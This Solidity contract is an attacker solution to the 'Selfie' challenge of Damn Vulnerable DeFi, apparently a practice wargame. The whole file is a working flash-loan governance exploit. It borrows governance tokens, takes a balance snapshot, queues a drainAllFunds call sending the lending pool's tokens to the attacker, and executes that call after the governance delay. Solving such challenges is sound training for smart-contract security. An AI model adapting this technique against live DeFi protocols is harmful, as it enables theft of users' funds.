// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
// import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title AttackerSelfie
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackerSelfie {
    using Address for address;
    using SafeMath for uint256;

    address private immutable owner;
    address private immutable pool;
    address private immutable governance;
    uint256 public actionId; // only for attacker

    constructor(address poolAddress, address governanceAddress) {
        owner = msg.sender;
        pool = poolAddress;
        governance = governanceAddress;
    }

    modifier onlyAttacker {
        require(msg.sender == owner, "Only owner can use this function");
        _;
    }

    modifier onlyPool {
        require(msg.sender == pool, "Only lending pool can use this function");
        _;
    }

    function executeFlashloan(uint256 amount) external onlyAttacker {
        // Execute flashloan
        SelfiePool(pool).flashLoan(amount);
    }

    function executeDrain() external onlyAttacker {
        // Doing this outside of flash loan because of governance time delay between queue action and execute action
        SimpleGovernance(governance).executeAction(actionId);
    }

    function receiveTokens(address token, uint256 amount) external onlyPool {
        // console.log(
        //     "Token balance:",
        //     ERC20Snapshot(token).balanceOf(address(this)) / 10**18
        // );
        
        // init token snapshot for verif at governance
        DamnValuableTokenSnapshot(token).snapshot();
        // uint256 snapshotId = DamnValuableTokenSnapshot(token).snapshot();

        // encode attack on lending pool
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)", 
            owner
        );

        // queue action for later
        actionId = SimpleGovernance(governance).queueAction(
            pool, // receiver will be the lending pool
            data, // drainFunds calldata
            0
        );

        DamnValuableTokenSnapshot(token).transfer(msg.sender, amount);
    }
}